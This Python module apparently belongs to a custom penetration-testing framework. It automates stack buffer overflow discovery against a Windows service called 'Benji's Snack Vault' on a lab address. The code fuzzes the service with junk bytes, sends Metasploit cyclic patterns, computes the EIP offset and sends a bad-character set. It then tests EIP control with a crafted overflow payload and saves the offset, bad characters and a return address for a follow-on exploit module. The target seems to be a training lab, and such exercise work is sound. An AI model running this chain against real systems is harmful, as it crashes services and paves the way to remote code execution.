#!/usr/bin/env python3
"""
Benji's Snack Vault - App Analysis Module
Cleaned & guided discovery tool with proper restart verification
"""

import socket
import time
import subprocess
from base_module import BaseModule
from utils import colored

class BenjisSnackVaultAnalysis(BaseModule):
    def __init__(self):
        super().__init__()
        self.name = "benjis_snack_vault_analysis"
        self.description = "Guided discovery module: fuzz, pattern, offset, badchars, control test"

        self.options = {
            "RHOST": {"value": "192.168.107.132", "required": True, "description": "Target IP"},
            "RPORT": {"value": 9999, "required": True, "description": "Target port"},
            "PREFIX": {"value": "MEOW ", "required": True, "description": "Command prefix"},
            "MODE": {"value": "full", "required": True, "description": "full | fuzz | pattern | badchars | test_offset"},
            "PATTERN_LENGTH": {"value": 3000, "required": False, "description": "Pattern length"},
            "OFFSET": {"value": 0, "required": False, "description": "Offset to EIP (auto-set in full mode)"},
            "CRLF": {"value": True, "required": False, "description": "Append \\r\\n"}
        }

    def show_help(self):
        print(colored("\n=== App Analysis Module ===", "yellow"))
        print("Recommended: set MODE full → run")
        print("This runs the full chain with restart verification.")

    def run(self):
        opts = {k: v["value"] for k, v in self.options.items()}
        mode = opts["MODE"].lower()

        if mode == "full":
            self._run_full_analysis()
        elif mode == "fuzz":
            self._run_fuzz()
        elif mode == "pattern":
            self._run_pattern()
        elif mode == "badchars":
            self._run_badchars()
        elif mode == "test_offset":
            self._run_test_offset()
        else:
            print(colored("[-] Unknown mode", "red"))

    # ===================================================================
    # GUIDED FULL ANALYSIS (main recommended mode)
    # ===================================================================
    def _run_full_analysis(self):
        print(colored("=== Starting Full App Analysis ===", "green"))
        input("Press Enter to begin...")

        # 1. Fuzz
        self._run_fuzz()
        self._wait_for_target("Fuzz crashed the app. Re-launch Benji's Snack Vault.exe as Administrator\nand re-attach Immunity Debugger.")

        # 2. Pattern
        self._run_pattern()
        self._wait_for_target("Pattern crashed the app. Re-launch Benji's Snack Vault.exe as Administrator\nand re-attach Immunity Debugger.")

        # 3. Offset calculation
        eip = input(colored("Enter EIP from Immunity (8 hex digits): ", "yellow")).strip().upper()
        offset = self._calc_offset(eip, int(self.options["PATTERN_LENGTH"]["value"]))
        if offset:
            self.options["OFFSET"]["value"] = offset
            print(colored(f"[+] OFFSET auto-set to {offset}", "green"))

        # 4. Badchars
        self._run_badchars()

        # 5. Final test
        self._run_test_offset()

        self._save_analysis_results()

        print(colored("\n=== Full analysis complete! ===", "green"))
        print("Results saved. You can now run the exploit module.")

    # ===================================================================
    # Helper: Wait for target to be back online
    # ===================================================================
    def _wait_for_target(self, message):
        print(colored(f"\nIMPORTANT: {message}", "red"))
        print("Press Enter when the app is running and listening again.")
        
        while True:
            input("Ready? (press Enter to test connection)")
            if self._test_connection():
                print(colored("[+] Target is responding — continuing...", "green"))
                return
            print(colored("[-] Still can't connect. Please restart the app and try again.", "red"))

    def _test_connection(self):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(2)
            s.connect((self.options["RHOST"]["value"], int(self.options["RPORT"]["value"])))
            s.close()
            return True
        except:
            return False

    # ===================================================================
    # Individual steps (kept simple)
    # ===================================================================
    def _run_fuzz(self):
        print(colored("[*] Fuzzing...", "yellow"))
        for size in range(100, 5000, 200):
            payload = self.options["PREFIX"]["value"].encode() + (b"A" * size) + b"\r\n"
            print(f"  Sending {size} junk bytes...", end="", flush=True)
            if self._send_payload(payload):
                print(" OK")
            else:
                print(colored(" CRASH!", "red"))
                print(colored(f"[!] Crash around {size} junk bytes", "green"))
                break
            time.sleep(0.2)

    def _run_pattern(self):
        length = int(self.options["PATTERN_LENGTH"]["value"])
        print(colored(f"[*] Sending {length}-byte pattern...", "yellow"))
        try:
            pattern = subprocess.check_output(
                ["/usr/share/metasploit-framework/tools/exploit/pattern_create.rb", "-l", str(length)],
                text=True
            ).strip().encode()
        except Exception as e:
            print(colored(f"[-] Failed to generate pattern: {e}", "red"))
            return

        payload = self.options["PREFIX"]["value"].encode() + pattern + b"\r\n"
        if self._send_payload(payload):
            print(colored("[+] Pattern sent successfully", "green"))
        else:
            print(colored("[!] Send failed", "red"))

    def _calc_offset(self, eip_hex, length):
        try:
            result = subprocess.check_output(
                ["/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb", "-q", eip_hex, "-l", str(length)],
                text=True
            ).strip()
            if "Exact match at offset" in result:
                offset = int(result.split()[-1])
                print(colored(f"[+] Exact match at offset {offset}", "green"))
                return offset
        except Exception as e:
            print(colored(f"[-] Offset calc failed: {e}", "red"))
        return None

    def _run_badchars(self):
        offset = int(self.options["OFFSET"]["value"])
        if offset == 0:
            print(colored("[-] OFFSET not set", "red"))
            return
        print(colored("[*] Sending badchars...", "yellow"))
        badchars = bytearray(b for b in range(1, 256) if b not in [0x00, 0x09, 0x0a, 0x0d])
        payload = self.options["PREFIX"]["value"].encode() + (b"A" * offset) + b"BBBB" + badchars + b"\r\n"
        self._send_payload(payload)
        print(colored("[+] Badchars sent. Check ESP dump in Immunity.", "green"))

    def _run_test_offset(self):
        offset = int(self.options["OFFSET"]["value"])
        if offset == 0:
            print(colored("[-] OFFSET not set", "red"))
            return
        print(colored("[*] Testing EIP control...", "yellow"))
        payload = self.options["PREFIX"]["value"].encode() + (b"A" * offset) + b"BBBB" + (b"C" * 300) + b"\r\n"
        self._send_payload(payload)
        print(colored("[+] Sent. Check if EIP = 42424242 in Immunity.", "green"))

    def _send_payload(self, payload):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(3)
            s.connect((self.options["RHOST"]["value"], int(self.options["RPORT"]["value"])))
            s.send(payload)
            s.close()
            return True
        except Exception as e:
            print(colored(f"[!] Connection failed: {e}", "red"))
            return False

    def _save_analysis_results(self):
        """Saves key results so the exploit module can auto-load them"""
        import json
        data = {
            "OFFSET": int(self.options["OFFSET"]["value"]),
            "BADCHARS": "\\x00\\x09\\x0a\\x0d",
            "RET": "0x114015f3",
            "PREFIX": self.options["PREFIX"]["value"],
            "TARGET": self.options["RHOST"]["value"]
        }
        try:
            with open("analysis_results.json", "w") as f:
                json.dump(data, f, indent=2)
            print(colored("[+] Analysis results saved to analysis_results.json", "green"))
        except Exception as e:
            print(colored(f"[-] Could not save results: {e}", "red"))

    def handle_command(self, cmd):
        if cmd.strip().lower() == "run":
            self.run()
            return
        super().handle_command(cmd)